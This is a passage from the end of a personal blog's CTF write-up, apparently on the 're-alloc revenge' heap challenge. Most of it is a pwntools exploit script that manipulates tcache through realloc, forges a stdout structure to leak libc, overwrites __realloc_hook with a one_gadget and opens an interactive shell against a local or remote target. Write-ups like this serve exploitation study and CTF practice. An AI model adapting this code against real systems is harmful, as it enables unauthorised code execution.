</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x451</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>9</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=s2>&#34;D&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 0x60 count++</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x60\xa7</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;&#34;&#34;b menu</span>
</span></span><span class=line><span class=cl>    <span class=c1># b read_input</span>
</span></span><span class=line><span class=cl>    <span class=c1># &#34;&#34;&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=s2>&#34;E&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;E&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;E&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b menu&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xfbad1800</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=o>+</span><span class=sa>b</span><span class=s2>&#34;leak:&#34;</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;leak:&#34;</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>log</span><span class=o>.</span><span class=n>debug</span><span class=p>(</span><span class=s2>&#34;failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>libc_base</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>8</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x1E5700</span>
</span></span><span class=line><span class=cl>    <span class=n>pf</span><span class=p>(</span><span class=s2>&#34;libc_base&#34;</span><span class=p>,</span> <span class=n>libc_base</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b menu&#34;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=s2>&#34;F&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>,</span> <span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b menu&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;F&#34;</span><span class=o>*</span><span class=mh>0x18</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x61</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;__realloc_hook&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=s2>&#34;G&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>realloc</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=s2>&#34;G&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># gdb.attach(io, &#34;b realloc&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=c1># allocate(1, 0x58, p64(libc_base+libc.sym[&#34;malloc&#34;])+p64(libc_base+one_gadget))</span>
</span></span><span class=line><span class=cl>    <span class=n>allocate</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>one_gadget</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Your choice: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Index:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;Size:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mh>0x58</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=n>locallibc</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=c1># if True:</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;----------------------------------------------------------&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>argc</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># io = process(localfile, aslr=False)</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>localfile</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>host</span><span class=p>,</span> <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=n>argc</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>host</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>port</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>exp</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>io</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=ref>ref<a hidden class=anchor aria-hidden=true href=#ref>#</a></h2><ol><li><p><a href=https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0>https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0</a></p></li><li><p><a href=http://blog.eonew.cn/archives/1190>http://blog.eonew.cn/archives/1190</a></p></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hhdx.xyz/tags/ctf/>CTF</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hhdx.xyz/>hhdx's blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>